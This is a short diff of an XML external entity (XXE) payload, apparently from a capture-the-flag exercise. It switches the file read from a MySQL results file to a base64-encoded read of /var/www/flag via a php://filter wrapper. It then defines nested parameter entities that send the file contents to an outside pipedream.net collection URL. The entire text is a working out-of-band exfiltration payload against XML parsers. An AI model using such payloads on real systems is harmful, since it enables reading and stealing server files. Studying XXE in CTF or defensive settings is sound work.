@@ -1,4 +1,4 @@
-<!ENTITY % d SYSTEM "file:///var/lib/mysql-files/results.txt">
+<!ENTITY % d SYSTEM "php://filter/convert.base64-encode/resource=/var/www/flag">
 <!ENTITY % c "<!ENTITY &#x25; rrr SYSTEM 'https://eny8nzgs41uxxs2.m.pipedream.net?asdf=%d;'>">
 %c;
 %rrr;
